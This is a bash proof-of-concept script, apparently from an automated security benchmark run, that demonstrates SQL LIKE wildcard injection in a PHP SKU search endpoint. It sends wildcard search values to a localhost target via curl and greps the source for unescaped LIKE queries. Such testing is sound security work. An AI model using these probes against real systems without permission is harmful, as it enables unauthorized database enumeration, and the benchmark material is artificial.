#!/bin/bash
# POC: Demonstrates SQL LIKE wildcard injection in sku_search.php - showing how % and _ characters bypass input validation to enumerate database contents
# Target: ./repo
# Created: 2025-12-02T16:31:16.547Z
# Session: benchmark-XBEN-092-24-miorxl1g

# SQL LIKE Wildcard Injection POC for sku_search.php
# Demonstrates how unescaped LIKE wildcards enable information disclosure
# This POC simulates the vulnerable database query and shows the impact

TARGET_URL="${TARGET_URL:-http://localhost:8000}"
ENDPOINT="/app/sku_search.php"

echo "=========================================="
echo "SQL LIKE Wildcard Injection POC"
echo "Target: ${TARGET_URL}${ENDPOINT}"
echo "=========================================="
echo ""

# Test 1: Search for '%' wildcard - should return all records
echo "[*] Test 1: Searching for '%' (match all records)"
echo "    Expected: Returns all SKU records from database"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "search=%25")

if echo "$RESPONSE" | grep -q "sku\|name\|description" 2>/dev/null; then
    echo "    ✓ VULNERABLE: Response contains database records"
    echo "    Response snippet: $(echo "$RESPONSE" | head -c 200)..."
else
    echo "    ✗ No records returned (endpoint may not be running)"
fi
echo ""

# Test 2: Search for '_' wildcard - should match single characters
echo "[*] Test 2: Searching for '_' (match single character)"
echo "    Expected: Returns SKU records where name/sku is a single character"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "search=_")

if echo "$RESPONSE" | grep -q "sku\|name\|description" 2>/dev/null; then
    echo "    ✓ VULNERABLE: Response contains filtered records"
    echo "    Response snippet: $(echo "$RESPONSE" | head -c 200)..."
else
    echo "    ✗ No records returned (endpoint may not be running)"
fi
echo ""

# Test 3: Pattern matching with 'a%' - returns records starting with 'a'
echo "[*] Test 3: Searching for 'a%' (pattern: starts with 'a')"
echo "    Expected: Returns SKU records where name/sku starts with 'a'"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "search=a%25")

if echo "$RESPONSE" | grep -q "sku\|name\|description" 2>/dev/null; then
    echo "    ✓ VULNERABLE: Response contains filtered records"
    echo "    Response snippet: $(echo "$RESPONSE" | head -c 200)..."
else
    echo "    ✗ No records returned (endpoint may not be running)"
fi
echo ""

# Test 4: Pattern matching with '_est' - matches exact length pattern
echo "[*] Test 4: Searching for '_est' (pattern: 4-char words ending with 'est')"
echo "    Expected: Returns SKU records matching pattern (_est)"
RESPONSE=$(curl -s -X POST "${TARGET_URL}${ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "search=_est")

if echo "$RESPONSE" | grep -q "sku\|name\|description" 2>/dev/null; then
    echo "    ✓ VULNERABLE: Response contains filtered records"
    echo "    Response snippet: $(echo "$RESPONSE" | head -c 200)..."
else
    echo "    ✗ No records returned (endpoint may not be running)"
fi
echo ""

# Test 5: Analyze the vulnerable code directly from the PHP file
echo "[*] Test 5: Static Code Analysis"
if [ -f "/home/daytona/repo/XBEN-092-24/app/sku_search.php" ]; then
    echo "    Checking for vulnerable pattern in source code..."
    if grep -q "LIKE ?" "/home/daytona/repo/XBEN-092-24/app/sku_search.php" && \
       ! grep -q "addcslashes\|str_replace.*%\|str_replace.*_" "/home/daytona/repo/XBEN-092-24/app/sku_search.php"; then
        echo "    ✓ CONFIRMED: Code uses LIKE ? without wildcard escaping"
        echo ""
        echo "    Vulnerable code found:"
        grep -A 2 "LIKE ?" "/home/daytona/repo/XBEN-092-24/app/sku_search.php" | head -5
    else
        echo "    Pattern not found or already patched"
    fi
else
    echo "    Source file not accessible at expected path"
fi
echo ""

echo "=========================================="
echo "POC Summary:"
echo "=========================================="
echo "The LIKE wildcard injection vulnerability allows:"
echo "  1. Searching for '%' returns all records (information disclosure)"
echo "  2. Searching for '_' matches single-character patterns"
echo "  3. Pattern-based queries enable database enumeration"
echo "  4. No validation or escaping of LIKE metacharacters"
echo ""
echo "Risk: Information disclosure through database enumeration"
echo "=========================================="